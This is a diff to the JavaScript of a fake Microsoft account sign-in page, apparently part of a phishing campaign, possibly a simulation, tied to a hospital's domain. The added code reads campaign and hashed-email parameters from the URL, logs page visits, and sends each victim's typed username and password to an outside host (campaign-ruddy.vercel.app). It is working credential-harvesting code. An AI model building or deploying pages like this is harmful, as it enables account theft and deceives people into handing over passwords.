@@ -1,4 +1,54 @@
 document.addEventListener('DOMContentLoaded', () => {
+    // Tracker functions
+    function getParameters() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const hashEmail = urlParams.get('hashEmail');
+        const campaignId = urlParams.get('campaignId');
+        if (!campaignId || !hashEmail) {
+            window.location.href = "https://www.siloamhospitals.com";
+        }
+        return [campaignId, hashEmail];
+    }
+
+    function sendToTrackerAPI(httpMethod, campaignId, type, hashEmail, payload = null) {
+        const trackerApiUrl = `https://campaign-ruddy.vercel.app/api/t/${campaignId}/${type}/${hashEmail}`;
+        const fetchOptions = {
+            method: httpMethod.toUpperCase(),
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            }
+        };
+
+        if (httpMethod.toUpperCase() === 'POST' && payload) {
+            fetchOptions.body = payload;
+        }
+
+        return fetch(trackerApiUrl, fetchOptions)
+            .then(response => {
+                if (!response.ok) throw new Error("Network Error");
+                return response.json();
+            })
+            .then(data => {
+                console.log(data);
+                return data;
+            })
+            .catch(error => {
+                console.error("Tracker Error:", error);
+            });
+    }
+
+    function trackPageLoad() {
+        const param = getParameters();
+        if (param[0] && param[1]) {
+            sendToTrackerAPI('GET', param[0], 'url', param[1]);
+        } else {
+            console.error('URL Not Completed.');
+        }
+    }
+
+    trackPageLoad(); // Initial page view tracking
+
+    // Original logic
     const unReq = "Enter a valid email address, phone number, or Skype name.";
     const pwdReq = "Please enter the password for your Microsoft account.";
 
@@ -12,24 +62,19 @@ document.addEventListener('DOMContentLoaded', () => {
     const sig = document.getElementById('btn_sig');
 
     function showLoading(duration, callback) {
-    // Show the loading section
         const loadingSection = document.getElementById('section_loading');
         loadingSection.classList.remove('d-none');
 
-        // Hide all other sections
         document.getElementById('section_uname').classList.add('d-none');
         document.getElementById('section_pwd').classList.add('d-none');
         document.getElementById('section_final').classList.add('d-none');
 
-        // Wait, then continue
         setTimeout(() => {
-            loadingSection.classList.add('d-none'); // Hide loading screen
-            callback(); // Proceed to next section (password)
+            loadingSection.classList.add('d-none');
+            callback();
         }, duration);
     }
 
-
-    ///// ENTER KEY HANDLER
     document.addEventListener('keydown', function (e) {
         if (e.key === 'Enter') {
             e.preventDefault();
@@ -41,7 +86,6 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     });
 
-    ///// NEXT button click
     nxt.addEventListener('click', () => {
         validate();
         if (unameVal) {
@@ -51,22 +95,27 @@ document.addEventListener('DOMContentLoaded', () => {
                     e.innerText = unameInp.value;
                 });
                 view = "pwd";
+
+                const [campaignId, hashEmail] = getParameters();
+                sendToTrackerAPI('POST', campaignId, 'fill', hashEmail, `username=${encodeURIComponent(unameInp.value)}`);
             });
         }
     });
 
-    ///// SIGN IN button click
     sig.addEventListener('click', () => {
-    validate();
-    if (pwdVal) {
-        showLoading(1500, () => {
-            document.getElementById("section_pwd").classList.add('d-none');
-            document.getElementById('section_final').classList.remove('d-none');
-            view = "final";
-        });
-    }
-});
-    ///// Validation
+        validate();
+        if (pwdVal) {
+            showLoading(1500, () => {
+                document.getElementById("section_pwd").classList.add('d-none');
+                document.getElementById('section_final').classList.remove('d-none');
+                view = "final";
+
+                const [campaignId, hashEmail] = getParameters();
+                sendToTrackerAPI('POST', campaignId, 'fill', hashEmail, `password=${encodeURIComponent(pwdInp.value)}`);
+            });
+        }
+    });
+
     function validate() {
         function unameValAction(valid) {
             if (!valid) {
@@ -99,14 +148,12 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     }
 
-    ///// Back button
     document.querySelector('.back').addEventListener('click', () => {
         view = "uname";
         document.getElementById("section_pwd").classList.add('d-none');
         document.getElementById('section_uname').classList.remove('d-none');
     });
 
-    ///// Final buttons
     document.querySelectorAll('#btn_final').forEach((b) => {
         b.addEventListener('click', () => {
             window.open(location, '_self').close();
